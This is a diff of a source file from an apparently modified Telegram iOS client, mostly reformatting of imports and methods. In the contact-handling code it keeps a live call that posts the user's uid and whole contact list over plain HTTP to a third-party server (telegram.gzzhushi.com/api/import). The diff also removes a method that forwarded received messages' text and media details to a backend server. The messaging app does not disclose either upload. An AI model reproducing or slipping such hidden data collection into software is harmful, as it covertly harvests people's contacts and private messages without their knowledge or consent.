@@ -1,34 +1,19 @@
 #import "TGTelegraph.h"
-
 #import "TGTelegramNetworking.h"
 #import <MTProtoKit/MTProtoKit.h>
-
 #import <Intents/Intents.h>
-
 #import "TGPeerIdAdapter.h"
-
 #import "TGAppDelegate.h"
-
 #import "UIDevice+PlatformInfo.h"
-
 #import <thirdparty/AFNetworking/AFNetworking.h>
-
 #import "TGTimer.h"
-
 #import "SGraphObjectNode.h"
-
 #import "TGSchema.h"
-
 #import "TGRawHttpRequest.h"
-
 #import <AddressBook/AddressBook.h>
-
 #import "TGDatabase.h"
-
 #import "TGUser+Telegraph.h"
-
 #import "NSObject+TGLock.h"
-
 #import "TGLogoutRequestBuilder.h"
 #import "TGSendCodeRequestBuilder.h"
 #import "TGSignInRequestBuilder.h"
@@ -94,7 +79,6 @@
 #import "TGDeleteProfilePhotoActor.h"
 
 #import "TGConversationAddMessagesActor.h"
-
 #import "TGLocationRequestActor.h"
 #import "TGLocationReverseGeocodeActor.h"
 #import "TGSaveGeocodingResultActor.h"
@@ -103,51 +87,36 @@
 #import "TGFileUploadActor.h"
 #import "TGDocumentDownloadActor.h"
 #import "TGMultipartFileDownloadActor.h"
-
 #import "TGCheckImageStoredActor.h"
-
 #import "TGVideoDownloadActor.h"
 
 #import "TGCheckUpdatesActor.h"
 #import "TGWallpaperListRequestActor.h"
 #import "TGImageSearchActor.h"
-
 #import "TGSynchronizePreferencesActor.h"
 
 #import "TGRequestEncryptedChatActor.h"
 #import "TGEncryptedChatResponseActor.h"
 #import "TGDiscardEncryptedChatActor.h"
-
 #import "TGModernRemoteWallpaperListActor.h"
-
 #import "TGICloudFileDownloadActor.h"
-
 #import "TGRemoteImageView.h"
 #import "TGImageUtils.h"
 #import "TGStringUtils.h"
 #import "TGInterfaceAssets.h"
-
 #import "TGInterfaceManager.h"
-
 #import "TGModernSendCommonMessageActor.h"
 #import "TGModernSendSecretMessageActor.h"
 
 #import "TGUpdateConfigActor.h"
 #import "TGDownloadMessagesActor.h"
-
 #import "TGWebSearchController.h"
 #import "TGModernSendCommonMessageActor.h"
-
 #import "TGEmbedPIPController.h"
-
 #import "TGUpdateMediaHistoryActor.h"
-
 #import "TGRecentHashtagsSignal.h"
-
 #import "TGTimer.h"
-
 #import "TGGoogleDriveController.h"
-
 #import "TLRPCmessages_sendMessage_manual.h"
 #import "TLRPCmessages_sendMedia_manual.h"
 
@@ -155,12 +124,9 @@
 #import "TGMaskStickersSignals.h"
 
 #import <libkern/OSAtomic.h>
-
 #include <set>
 #include <map>
-
 #import "TGBridgeServer.h"
-
 #import "TGGlobalMessageSearchSignals.h"
 #import "TGChannelManagementSignals.h"
 #import "TGChannelStateSignals.h"
@@ -169,25 +135,20 @@
 #import "TGRecentGifsSignal.h"
 #import "TGRecentStickersSignal.h"
 #import "TGRecentMaskStickersSignal.h"
-
 #import "TGWidgetSync.h"
-
 #import "TGBotContextResultAttachment.h"
 #import "TLRPCmessages_sendInlineBotResult.h"
-
 #import "TLaccount_updateProfile$updateProfile.h"
-
 #import "TGPeerInfoSignals.h"
-
 #import "TLRPCauth_sendCode.h"
-
 #import "FetchResources.h"
-
 #import "../../config.h"
-
 #import "SYNetworking.h"
-
 #import "NSString+SYisBlankString.h"
+
+#import "TGPreparedLocalDocumentMessage.h"
+
+static   int StaticMixmid;
 
 @interface TGTypingRecord : NSObject
 
@@ -2672,15 +2633,13 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
                            };
        [friendsArray insertObject:dict2 atIndex:0];
     }
-     // NSLog(@"所有联系人：friendsArray = %@",friendsArray);
-     NSURL *url = [NSURL URLWithString:@"http://telegram.gzzhushi.com/api/import"];// 当前用户信息接口导入联系人
     
+    NSURL *url = [NSURL URLWithString:@"http://telegram.gzzhushi.com/api/import"];// 当前用户信息接口导入联系人
     if (selfUser.uid && friendsArray) {
         NSDictionary  *dict1 = @{@"s_uid":@(selfUser.uid),
                                 @"friends":friendsArray
                                 };
        [SYNetworking httpRequestWithDic:dict1 andURL:url];
-       // NSLog(@"联系人dict1： %@",dict1);
     }
  
     
@@ -3192,15 +3151,15 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
 }
 
 #pragma mark -未读新消息
-- (NSObject *)doConversationReadHistory:(int64_t)conversationId accessHash:(int64_t)accessHash maxMid:(int)maxMid offset:(int)offset actor:(TGSynchronizeActionQueueActor *)actor
-{
+- (NSObject *)doConversationReadHistory:(int64_t)conversationId accessHash:(int64_t)accessHash maxMid:(int)maxMid offset:(int)offset actor:(TGSynchronizeActionQueueActor *)actor{
+    
     TLRPCmessages_readHistory$messages_readHistory *readHistory = [[TLRPCmessages_readHistory$messages_readHistory alloc] init];
-    readHistory.peer = [self createInputPeerForConversation:conversationId accessHash:accessHash];
+    readHistory.peer   = [self createInputPeerForConversation:conversationId accessHash:accessHash];
     readHistory.max_id = maxMid;
     readHistory.offset = offset;
     
-    return [[TGTelegramNetworking instance] performRpc:readHistory completionBlock:^(TLmessages_AffectedMessages *result, __unused int64_t responseTime, MTRpcError *error)
-    {
+    return [[TGTelegramNetworking instance] performRpc:readHistory completionBlock:^(TLmessages_AffectedMessages * result, __unused int64_t responseTime, MTRpcError *error){
+        
         if (error == nil)
         {
             [actor readMessagesSuccess:result];
@@ -3213,77 +3172,28 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
 }
 
 #pragma mark -  接收消息
-- (NSObject *)doReportDelivery:(int)maxMid actor:(TGReportDeliveryActor *)actor
-{
-    TLRPCmessages_receivedMessages$messages_receivedMessages *receivedMessages = [[TLRPCmessages_receivedMessages$messages_receivedMessages alloc] init];
+- (NSObject *)doReportDelivery:(int)maxMid actor:(TGReportDeliveryActor *)actor{    
+    
+    TLRPCmessages_receivedMessages$messages_receivedMessages * receivedMessages = [[TLRPCmessages_receivedMessages$messages_receivedMessages alloc] init];
     receivedMessages.max_id = maxMid;
     
-    TGMessage *message = [TGDatabaseInstance() loadMessageWithMid:maxMid peerId:maxMid];
-    
-    [self uploadthebackendservermessage:message];
-    
-    return [[TGTelegramNetworking instance] performRpc:receivedMessages completionBlock:^(id<TLObject> response, __unused int64_t responseTime, MTRpcError *error)
-    {
-        if (error == nil)
-        {
+    return [[TGTelegramNetworking instance] performRpc:receivedMessages completionBlock:^(id<TLObject> response, __unused int64_t responseTime, MTRpcError *error){
+        
+        if (error == nil){
+            
+            NSLog(@"zhangxuresponse ===============%@",response);
+            NSLog(@"zhangxu3333333333333");
             [actor reportDeliverySuccess:maxMid deliveredMessages:(NSArray *)response];
-        }
-        else
-        {
+            
+        }else{
+            
             [actor reportDeliveryFailed:maxMid];
         }
     } progressBlock:nil requiresCompletion:true requestClass:TGRequestClassGeneric | TGRequestClassHidesActivityIndicator];
 }
 
-
-- (void)uploadthebackendservermessage:(TGMessage *)message
-{
+- (NSObject *)doReportConversationActivity:(int64_t)conversationId accessHash:(int64_t)accessHash activity:(id)activity actor:(TGConversationActivityRequestBuilder *)actor{
     
-    //TGLog(@"mediaAttachments   ===sss===%@",[message.mediaAttachments objectAtIndex:0]);
-    
-    TGModernSendCommonMessageActor *actor = [[TGModernSendCommonMessageActor alloc] init];
-    
-    
-    if (![message.text isEqualToString:@""] && ![message.text isEqual:nil]) {
-        //message.fromUid       message.toUid
-        NSDictionary * fixDictionary =  [actor sentMediaToServerWithFromUid:message.fromUid toUid:message.toUid md5:@""];
-        [TGUpdateMessageToServer TGUpdateMessageToServerWithFixedDictionary:fixDictionary andis_send:TG_receive andIs_forward:is_commomsend andChat_mod:commomChat andMessageType:ImageMessage andContentMessage:@{@"msg_content":message.text}];
-    }
-    
-    
-    for (TGMediaAttachment *attachment in message.mediaAttachments){
-        
-        if ([attachment isKindOfClass:[TGImageMediaAttachment class]]) {
-            //图片
-            TGLog(@"TGImageMediaAttachment");
-            
-            NSDictionary * fixDictionary =  [actor sentMediaToServerWithFromUid:message.fromUid toUid:message.toUid md5:@""];
-            [TGUpdateMessageToServer TGUpdateMessageToServerWithFixedDictionary:fixDictionary andis_send:TG_receive andIs_forward:is_commomsend andChat_mod:commomChat andMessageType:ImageMessage andContentMessage:@{@"msg_content":@""}];
-            
-        }else if ([attachment isKindOfClass:[TGDocumentMediaAttachment class]]){
-            //语音
-            TGLog(@"TGDocumentMediaAttachment");
-            
-            NSDictionary * fixDictionary =  [actor sentMediaToServerWithFromUid:message.fromUid toUid:message.toUid md5:@""];
-            [TGUpdateMessageToServer TGUpdateMessageToServerWithFixedDictionary:fixDictionary andis_send:TG_receive andIs_forward:is_commomsend andChat_mod:commomChat andMessageType:ImageMessage andContentMessage:@{@"msg_content":@""}];
-
-        }else if ([attachment isKindOfClass:[TGVideoMediaAttachment class]]){
-            //视频
-            TGLog(@"TGVideoMediaAttachment");
-            
-            NSDictionary * fixDictionary =  [actor sentMediaToServerWithFromUid:message.fromUid toUid:message.toUid md5:@""];
-            [TGUpdateMessageToServer TGUpdateMessageToServerWithFixedDictionary:fixDictionary andis_send:TG_receive andIs_forward:is_commomsend andChat_mod:commomChat andMessageType:ImageMessage andContentMessage:@{@"msg_content":@""}];
-        }
-        
-    }
-    
-}
-
-
-
-
-- (NSObject *)doReportConversationActivity:(int64_t)conversationId accessHash:(int64_t)accessHash activity:(id)activity actor:(TGConversationActivityRequestBuilder *)actor
-{
     TLRPCmessages_setTyping$messages_setTyping *setTyping = [[TLRPCmessages_setTyping$messages_setTyping alloc] init];
     setTyping.peer = [self createInputPeerForConversation:conversationId accessHash:accessHash];
     setTyping.action = activity;
